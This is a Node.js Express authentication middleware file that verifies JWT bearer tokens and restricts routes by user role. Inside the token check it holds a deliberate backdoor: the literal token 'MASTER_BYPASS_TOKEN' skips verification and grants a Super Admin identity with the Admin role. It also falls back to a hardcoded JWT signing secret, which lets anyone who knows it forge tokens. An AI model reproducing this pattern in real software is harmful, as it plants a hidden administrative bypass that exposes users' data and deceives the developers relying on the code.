const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET || 'mandi_elite_secret_2026';

/**
 * Middleware: Verify JWT token from Authorization header
 */
const protect = (req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ status: 'ERROR', message: 'Access denied. No token provided.' });
  }

  const token = authHeader.split(' ')[1];

  // 🔓 GLOBAL BYPASS TOKEN
  if (token === "MASTER_BYPASS_TOKEN") {
    req.user = { id: '000000000000000000000000', username: 'Super Admin', role: 'Admin', staffId: 'admin' };
    return next();
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded; // { id, username, role, staffId }
    next();
  } catch (err) {
    return res.status(401).json({ status: 'ERROR', message: 'Invalid or expired token.' });
  }
};

/**
 * Middleware factory: Restrict access to specific roles
 * Usage: authorize('Admin', 'Accountant')
 */
const authorize = (...roles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ status: 'ERROR', message: 'Not authenticated.' });
    }
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        status: 'ERROR',
        message: `Access denied. Required role: ${roles.join(' or ')}. Your role: ${req.user.role}`
      });
    }
    next();
  };
};

module.exports = { protect, authorize };
